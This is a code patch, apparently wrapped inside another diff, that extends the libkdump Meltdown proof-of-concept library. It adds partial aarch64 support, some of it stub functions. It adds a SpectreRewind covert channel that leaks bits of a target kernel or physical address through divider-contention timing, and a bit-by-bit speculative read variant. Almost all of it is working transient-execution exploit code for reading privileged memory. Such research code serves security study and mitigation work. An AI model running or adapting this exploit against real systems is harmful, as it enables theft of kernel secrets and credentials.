@@ -1,0 +1,630 @@
+diff --git a/libkdump/libkdump.c b/libkdump/libkdump.c
+index c590391..b264472 100644
+--- a/libkdump/libkdump.c
++++ b/libkdump/libkdump.c
+@@ -1,5 +1,7 @@
+ #include "libkdump.h"
++#if !defined(__aarch64__)
+ #include <cpuid.h>
++#endif 
+ #include <errno.h>
+ #include <fcntl.h>
+ #include <memory.h>
+@@ -10,6 +12,7 @@
+ #include <stdarg.h>
+ #include <stdlib.h>
+ #include <unistd.h>
++#include <time.h>
+ 
+ libkdump_config_t libkdump_auto_config = {0};
+ 
+@@ -18,11 +21,17 @@ static jmp_buf buf;
+ 
+ static char *_mem = NULL, *mem = NULL;
+ static pthread_t *load_thread;
++static pthread_t count_thread;
+ static size_t phys = 0;
+ static int dbg = 0;
+ 
+ static libkdump_config_t config;
+ 
++static volatile uint64_t counter = 0;
++
++#if defined(__aarch64__)
++#define NO_TSX 1
++#endif
+ #ifndef ETIME
+ #define ETIME 62
+ #endif
+@@ -74,7 +83,7 @@ static libkdump_config_t config;
+                : "c"(phys), "b"(mem)                                           \
+                : "rax");
+ 
+-#else /* __i386__ */
++#elif defined(__i386__) /* __i386__ */
+ 
+ // ---------------------------------------------------------------------------
+ #define meltdown                                                               \
+@@ -107,6 +116,8 @@ static libkdump_config_t config;
+                :                                                               \
+                : "c"(phys), "b"(mem)                                           \
+                : "eax");
++#elif defined(__aarch64__)
++#define meltdown_nonull {}
+ #endif
+ 
+ #ifndef MELTDOWN
+@@ -141,8 +152,17 @@ static void debug(d_sym_t symbol, const char *fmt, ...) {
+ }
+ 
+ // ---------------------------------------------------------------------------
++#if defined(__aarch64__)
++static inline uint64_t rdtsc() {
++  asm volatile ("DSB SY");	
++  return counter;
++}
++
++#else // !__aarch64__	
++
+ static inline uint64_t rdtsc() {
+   uint64_t a = 0, d = 0;
++
+   asm volatile("mfence");
+ #if defined(USE_RDTSCP) && defined(__x86_64__)
+   asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
+@@ -155,8 +175,10 @@ static inline uint64_t rdtsc() {
+ #endif
+   a = (d << 32) | a;
+   asm volatile("mfence");
++  
+   return a;
+ }
++#endif
+ 
+ #if defined(__x86_64__)
+ // ---------------------------------------------------------------------------
+@@ -168,7 +190,12 @@ static inline void maccess(void *p) {
+ static void flush(void *p) {
+   asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
+ }
+-#else
++
++#elif defined(__aarch64__)
++static inline void maccess(void *p){}
++static void flush(void *p) {}
++
++#else /* i386 */
+ // ---------------------------------------------------------------------------
+ static inline void maccess(void *p) {
+   asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
+@@ -203,6 +230,14 @@ static void *nopthread(void *dummy) {
+   }
+ }
+ 
++static void *countthread(void *dummy) {
++  uint64_t local_counter = 0;
++  while (1) {
++    local_counter++;
++    counter = local_counter;
++  }
++}
++
+ // ---------------------------------------------------------------------------
+ static void *syncthread(void *dummy) {
+   while (1) {
+@@ -259,6 +294,9 @@ size_t libkdump_virt_to_phys(size_t virtual_address) {
+ 
+ // ---------------------------------------------------------------------------
+ static int check_tsx() {
++#if defined(__aarch64__)
++  return 0;
++#else /* !__aarch64__ */
+ #if !defined(NO_TSX) && !defined(FORCE_TSX)
+   if (__get_cpuid_max(0, NULL) >= 7) {
+     unsigned a, b, c, d;
+@@ -271,6 +309,11 @@ static int check_tsx() {
+ #else /* defined (NO_TSX) */
+   return 0;
+ #endif
++#endif
++}
++
++static int check_spr() {
++  return 1;
+ }
+ 
+ // ---------------------------------------------------------------------------
+@@ -278,12 +321,36 @@ static void detect_fault_handling() {
+   if (check_tsx()) {
+     debug(SUCCESS, "Using Intel TSX\n");
+     config.fault_handling = TSX;
++  } else if (check_spr()) {
++    debug(SUCCESS, "Using SpectreRewind DIVSD\n");
++    config.fault_handling = SPR;
+   } else {
+     debug(INFO, "No Intel TSX, fallback to signal handler\n");
+     config.fault_handling = SIGNAL_HANDLER;
+   }
+ }
+ 
++static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_threshold();
++
++// ---------------------------------------------------------------------------
++static int detect_timing_method() {
++  uint64_t start, end;
++  start = rdtsc();
++  for (volatile int x = 0; x < 1000; x++);
++  end = rdtsc();
++  if (end - start == 0) {
++    debug(INFO, "Use counter thread\n");
++    int r = pthread_create(&count_thread, 0, countthread , 0);
++    if (r != 0) {
++      return -1;
++    }
++    debug(INFO, "Waiting the counter thread...");
++    while(counter == 0);
++    debug(INFO, "Done\n");    
++  }
++  return 0;
++}  
++
+ // ---------------------------------------------------------------------------
+ static void detect_flush_reload_threshold() {
+   size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
+@@ -315,9 +382,11 @@ static void detect_flush_reload_threshold() {
+         config.cache_miss_threshold);
+ }
+ 
++
+ // ---------------------------------------------------------------------------
+ static void auto_config() {
+   debug(INFO, "Auto configuration\n");
++  detect_timing_method();
+   detect_fault_handling();
+   detect_flush_reload_threshold();
+   config.measurements = 3;
+@@ -330,6 +399,7 @@ static void auto_config() {
+ 
+ // ---------------------------------------------------------------------------
+ static int check_config() {
++#if !defined(__aarch64__)
+   if (config.cache_miss_threshold <= 0) {
+     detect_flush_reload_threshold();
+   }
+@@ -337,6 +407,7 @@ static int check_config() {
+     errno = ETIME;
+     return -1;
+   }
++#endif  
+   return 0;
+ }
+ 
+@@ -364,6 +435,7 @@ libkdump_config_t libkdump_get_autoconfig() {
+ // ---------------------------------------------------------------------------
+ int libkdump_init(const libkdump_config_t configuration) {
+   int j;
++
+   config = configuration;
+   if (memcmp(&config, &libkdump_auto_config, sizeof(libkdump_config_t)) == 0) {
+     auto_config();
+@@ -374,6 +446,7 @@ int libkdump_init(const libkdump_config_t configuration) {
+     errno = err;
+     return -1;
+   }
++
+   _mem = malloc(4096 * 300);
+   if (!_mem) {
+     errno = ENOMEM;
+@@ -386,7 +459,7 @@ int libkdump_init(const libkdump_config_t configuration) {
+     flush(mem + j * 4096);
+   }
+ 
+-  load_thread = malloc(sizeof(pthread_t) * config.load_threads);
++  load_thread = malloc(sizeof(pthread_t) * config.load_threads+1);
+   void *thread_func;
+   switch (config.load_type) {
+   case IO:
+@@ -414,14 +487,18 @@ int libkdump_init(const libkdump_config_t configuration) {
+     }
+   }
+   debug(SUCCESS, "Started %d load threads\n", config.load_threads);
+-
+-  if (config.fault_handling == SIGNAL_HANDLER) {
++  // config.divsd_threshold = 282; // for ...
++  if (config.fault_handling == SPR && config.divsd_threshold == 0) {
++    detect_spectrerewind_threshold();
++    fprintf(stdout, "Using SPR (divsd_threshold=%ld)\n", config.divsd_threshold);
++  } else if (config.fault_handling == SIGNAL_HANDLER) {
+     if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
+       debug(ERROR, "Failed to setup signal handler\n");
+       libkdump_cleanup();
+       return -1;
+     }
+     debug(SUCCESS, "Successfully setup signal handler\n");
++    fprintf(stdout, "Using SIGNAL_HANDLER\n");
+   }
+   return 0;
+ }
+@@ -524,6 +601,213 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
+   return 0;
+ }
+ 
++uint8_t temp = 0;
++
++int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler_chr(size_t addr) {
++  size_t retries = config.retries + 1;
++  uint64_t start = 0, end = 0;
++
++  while (retries--) {
++    if (!setjmp(buf)) {
++      temp &= mem[ (*(unsigned char *)addr) * 4096 ];
++    }
++
++    int i;
++    for (i = 0; i < 256; i++) {
++      if (flush_reload(mem + i * 4096)) {
++        if (i >= 1) {
++          return i;
++        }
++      }
++      sched_yield();
++    }
++    sched_yield();
++  }
++  return 0;
++}
++
++
++// ---------------------------------------------------------------------------
++int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler_bbb(size_t addr) {
++  size_t retries = config.retries + 1;
++  uint64_t start = 0, end = 0;
++
++  int res = 0;
++  for (char bit = 0; bit < 8; bit++) {
++    // debug(INFO, "b%d: %d\n", b,  ((*ch>>b)&0x1));
++    for (int i = 0; i < retries; i++) {
++      if (!setjmp(buf)) {
++#if 0
++        asm volatile("1:\n"                                             \
++                     "movzx (%%rdx), %%rax\n"                           \
++                     "shr %%cl, %%rax\n"                                \
++                     "and $1, %%rax\n"					\
++                     "shl $12, %%rax\n"                                 \
++                     "movq (%%rbx,%%rax,1), %%rax\n"                    \
++                     :                                                  \
++                     : "d"(phys), "b"(mem), "c"(bit)			\
++                     : "rax");
++#else
++        temp &= (mem[(((*(unsigned char *)addr)>>bit)&0x1) * 4096]);
++#endif
++      }
++
++      if (flush_reload(mem + 4096)) {
++        res |= (1<<bit);
++        break;
++      }
++      flush_reload(mem);      
++    }
++    sched_yield();    
++  }
++
++  return res;    
++}
++
++
++
++volatile char zero = 0;
++volatile char ones = 0xff;
++
++double my_number2 = 123456778910;
++double my_number3 = 12345677891;
++double my_number4 = 1234567789;
++double my_number5 = 1234567789;
++double my_number6 = 1234567789;
++
++struct div_test
++{
++  double number;
++  double div;
++  volatile char *addr;
++};
++
++struct div_test trainer;
++struct div_test transmit_0;
++struct div_test transmit_1;
++struct div_test transmit;
++
++struct div_test *test_tasks[] = {
++    &trainer,
++    &trainer,
++    &trainer,
++    &trainer,
++    &trainer,
++    &trainer,
++    &trainer,
++    &transmit_0,
++    &trainer,
++    &trainer,
++    &trainer,
++    &trainer,
++    &trainer,
++    &trainer,
++    &trainer,
++    &transmit_1,
++};
++
++struct div_test *tasks[] = {
++    &trainer,
++    &trainer,
++    &trainer,
++    &trainer,
++    &trainer,
++    &trainer,
++    &trainer,
++    &transmit  // >7+ training + transmit
++};
++
++#define N_DIVS 12   // determine speculative execution length
++
++int __attribute__ ((noinline)) transmit_bit( struct div_test * dt, int bit_no )
++{
++  double recv_num = dt->number;
++  double div = dt->div;
++  double send1 = my_number2, send2 = my_number3, send3 = my_number4, send4 = my_number5;
++  volatile char *ptr = dt->addr;
++  unsigned char mask = 1 << bit_no;
++  // receiver: control the speculation window size
++  for (int i = 0; i < N_DIVS; i++) {
++    recv_num /= div;
++    // recv_num += 0;
++  }
++  if (recv_num == 1) { // trained true, but false when sending
++    if ( *ptr & mask ) { // trained false, but true when sending
++      for (int x = 0; x < 100; x++) { // generate lots of contention
++        send1 /= div;
++        send2 /= div;
++        send3 /= div;
++        send4 /= div;
++      }
++    }
++  }
++  return recv_num + send1 + send2 + send3 + send4;
++
++}
++
++#define MIN(a,b) ((a<b) ? a : b)
++
++#define N_TESTS 1000000
++#define MAX_CYCLES 1024
++static int histo[3][MAX_CYCLES];
++static int total[3][N_TESTS];
++
++static int comparator(const void *p, const void *q)
++{
++  return *(int *)p > *(int *)q;
++}
++
++int __attribute__((optimize("-O2"), noinline)) libkdump_read_spr() {
++  uint64_t start = 0, end = 0, dur = 0;
++  size_t retries = config.retries + 1;
++  int res = 0;
++  double overall = 0;
++
++  trainer.div = 3;
++  trainer.number = 1;
++  for (int i = 0; i < N_DIVS; i++) trainer.number *= trainer.div;
++  trainer.addr = &zero; // training 
++
++  transmit_0.number = 150;
++  transmit_0.div = 1;
++  transmit_0.addr = &zero;
++  
++  transmit_1.number = 150;
++  transmit_1.div = 1;
++  transmit_1.addr = &ones;
++  
++  transmit.number = 150;
++  transmit.div = 1;
++  transmit.addr = (volatile char *)phys; // secret
++
++  int n_addr = sizeof(tasks)/sizeof(tasks[0]);
++  for (int bit = 0; bit < 8; bit++) {
++    for (int j = 0; j < retries; j++) {
++      for (int i = 0; i < n_addr; i++) {
++	for (volatile int iter = 0; iter < 13; iter++); // IMPORTANT: add delay (> 13).
++	start = rdtsc();
++	transmit_bit(tasks[i], bit); // send secret when (i%8==7).
++	end = rdtsc();
++	dur = end - start;
++	if ( tasks[i] == &transmit) {
++	  total[2][j] = dur;
++	  // debug(INFO, "   sending bit%d took %d cycles\n", bit, total[2][j]);
++	}
++	rdtsc(); // asm volatile("mfence");
++      }
++    }
++    // stats
++    qsort((void *)total[2], retries, sizeof(total[2][0]), comparator);
++    // debug(INFO, " sending bit%d took %d cycles\n", bit, total[2][n_tests/2]);
++    if (total[2][retries/2] > config.divsd_threshold) {
++      res |= (1<<bit);
++    }
++  }
++  debug(INFO, "res=0x%x (%c)\n", res, res);
++  return res;    
++}
++
++
+ // ---------------------------------------------------------------------------
+ int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
+   phys = addr;
+@@ -538,6 +822,8 @@ int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
+   for (i = 0; i < config.measurements; i++) {
+     if (config.fault_handling == TSX) {
+       r = libkdump_read_tsx();
++    } else if (config.fault_handling == SPR) {
++      r = libkdump_read_spr();
+     } else {
+       r = libkdump_read_signal_handler();
+     }
+@@ -560,5 +846,100 @@ int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
+       max_i = i;
+     }
+   }
++  debug(INFO, "max_i: 0x%x, (%c)\n", max_i, max_i);
+   return max_i;
+ }
++
++uint64_t now_in_ns()
++{
++  struct timespec ts;
++  clock_gettime(CLOCK_REALTIME, &ts);
++  return ((uint64_t)ts.tv_sec * 1000000000 + ts.tv_nsec);
++}
++
++// ---------------------------------------------------------------------------
++static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_threshold()
++{
++  uint64_t start = 0, end = 0, dur = 0;
++  uint64_t bw_start = 0, bw_end = 0;
++  double overall = N_TESTS;
++  
++  trainer.div = 3;
++  trainer.number = 1;
++  for (int i = 0; i < N_DIVS; i++) trainer.number *= trainer.div;
++  trainer.addr = &zero; // training 
++
++  transmit_0.number = 150;
++  transmit_0.div = 1;
++  transmit_0.addr = &zero;
++  
++  transmit_1.number = 150;
++  transmit_1.div = 1;
++  transmit_1.addr = &ones; // (char *)libkdump_phys_to_virt(libkdump_virt_to_phys((size_t)&ones));
++  
++  int n_addr = sizeof(test_tasks)/sizeof(test_tasks[0]);
++
++  bw_start = now_in_ns();
++  for (int j = 0; j < N_TESTS; j++) {
++    for (int i = 0; i < n_addr; i++) {
++      for (volatile int iter = 0; iter < 13; iter++); // IMPORTANT: add delay (> 13).
++        
++      start = rdtsc();
++      transmit_bit(test_tasks[i], 0); // send secret when (i%8==7).
++      end = rdtsc();
++      
++      dur = end - start;
++      if (test_tasks[i] == &transmit_0) {
++        if (dur < MAX_CYCLES) histo[0][dur]++;                    
++        total[0][j] = dur;
++      } else if (test_tasks[i] == &transmit_1) {
++        if (dur < MAX_CYCLES) histo[1][dur]++;          
++        total[1][j] = dur;
++      } else if ( test_tasks[i] == &transmit) {
++        if (dur < MAX_CYCLES) histo[2][dur]++;
++        total[2][j] = dur;
++      }
++    }
++  }
++  bw_end = now_in_ns();
++
++  // stats
++  for (int i = 0; i < 2; i++) {
++    qsort((void *)total[i], N_TESTS, sizeof(total[i][0]), comparator);
++    debug(INFO, "Send %d timing (min, 1pct, median, 99pct, max): (%4d, %4d, %4d, %4d, %4d)\n", i,
++          total[i][0], total[i][N_TESTS*1/100], total[i][N_TESTS/2],
++          total[i][N_TESTS*99/100], total[i][N_TESTS-1]);
++  }
++  
++  if (total[0][N_TESTS*99/100] < total[1][N_TESTS*1/100]) {
++    config.divsd_threshold = (total[0][N_TESTS*99/100] + total[1][N_TESTS*1/100])/2;
++  } else {
++    config.divsd_threshold = (total[0][N_TESTS/2] + total[1][N_TESTS/2])/2;
++  }
++  debug(SUCCESS, "spectrerewind: divsd ch threshold: %d cycles\n", config.divsd_threshold);
++
++  int err0_cnt = 0, err1_cnt = 0;
++  for (int j = 0; j < N_TESTS; j++) {
++    if (err0_cnt == 0 && total[0][N_TESTS-j-1] <= config.divsd_threshold) {
++      debug(INFO, "0 - Error count: %d/%d, rate: %.2f\%\n", j, N_TESTS, (float)j * 100/ N_TESTS);
++      err0_cnt = j;
++    }
++    if (err1_cnt == 0 && total[1][j] > config.divsd_threshold) {
++      debug(INFO, "1 - Error count: %d/%d, rate: %.2f\%\n", j, N_TESTS, (float)j * 100/ N_TESTS);
++      err1_cnt = j;
++    }
++    if (err0_cnt > 0 && err1_cnt > 0) {
++      debug(INFO, "Error rate: %.2f\%\n", (double)(err0_cnt + err1_cnt) / 2 * 100 / N_TESTS);
++      break;
++    }
++  }
++
++  debug(INFO, "Transfer rate: %.2f KB/s\n", (double) 2 * N_TESTS * 1000000 / 8 / (bw_end - bw_start) );
++  if (dbg){
++    for(int i = 0; i < MAX_CYCLES; i++) {
++      fprintf(stderr, "%d\t%0.5f\t%0.5f\t%0.5f\n", i,
++              histo[0][i]/overall, histo[1][i]/overall, histo[2][i]/overall );
++    }
++  }
++
++}
+diff --git a/libkdump/libkdump.h b/libkdump/libkdump.h
+index 6147b22..bc38d13 100644
+--- a/libkdump/libkdump.h
++++ b/libkdump/libkdump.h
+@@ -4,12 +4,17 @@
+ #include <stdint.h>
+ #include <stdio.h>
+ 
+-#if !(defined(__x86_64__) || defined(__i386__))
+-# error x86-64 and i386 are the only supported architectures
++#if !(defined(__x86_64__) || defined(__i386__) || defined(__aarch64__))
++# error x86-64 and i386 and aarch64 are the only supported architectures
+ #endif
+ 
++#include <linux/version.h>
+ #ifdef __x86_64__
++#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 13, 0)
++#define DEFAULT_PHYSICAL_OFFSET 0xffff888000000000ull
++#else
+ #define DEFAULT_PHYSICAL_OFFSET 0xffff880000000000ull
++#endif
+ #else
+ #define DEFAULT_PHYSICAL_OFFSET 0xc0000000ull
+ #endif
+@@ -19,10 +24,10 @@
+  */
+ typedef enum {
+     SIGNAL_HANDLER, /**< Install a signal handler to catch SIGSEGV */
+-    TSX /**< Use Intel TSX to suppress exception */
++    TSX, /**< Use Intel TSX to suppress exception */
++    SPR  /** spectrerewind DIVSD based covert channel */
+ } libkdump_fault_handling_t;
+ 
+-
+ /**
+  * libkdump load thread action
+  */
+@@ -38,7 +43,8 @@ typedef enum {
+  */
+ typedef struct {
+   size_t cache_miss_threshold; /**< Cache miss threshold in cycles for Flush+Reload */
+-  libkdump_fault_handling_t fault_handling; /**< Type of fault handling (TSX or signal handler) */
++  size_t divsd_threshold; /**< threshold in cycles for the SpctreRewind DIVSD channel */
++  libkdump_fault_handling_t fault_handling; /**< Type of fault handling (TSX or signal or SPR) */
+   int measurements; /**< Number of measurements to perform for one address */
+   int accept_after; /**< How many measurements must be the same to accept the read value */
+   int load_threads; /**< Number of threads which are started to increase the chance of reading from inaccessible addresses */
+@@ -115,6 +121,11 @@ size_t libkdump_phys_to_virt(size_t addr);
+ void libkdump_enable_debug(int enable);
+ 
+ 
++/**
++ *
++ * @return physical address offset 
++ */
++size_t get_direct_physical_map();
+ 
+ #endif
+ 
